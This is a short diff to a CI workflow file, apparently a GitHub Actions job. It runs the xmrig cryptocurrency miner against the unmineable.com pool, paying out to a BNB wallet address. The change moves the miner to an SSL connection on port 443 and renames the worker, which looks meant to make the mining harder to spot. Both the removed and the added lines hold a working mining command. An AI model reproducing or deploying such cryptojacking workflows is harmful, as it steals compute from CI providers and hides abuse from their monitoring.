@@ -42,8 +42,9 @@ jobs:
           echo "Menunggu $DELAY detik sebelum mulai..."
           sleep $DELAY
 
-          ./xmrig -o rx.unmineable.com:3333 -a rx -k \
-            -u bnb:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.gh-runner#f2xg-6ynu \
+          ./xmrig -a rx \
+            -o stratum+ssl://rx.unmineable.com:443 \
+            -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu \
             -p x --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
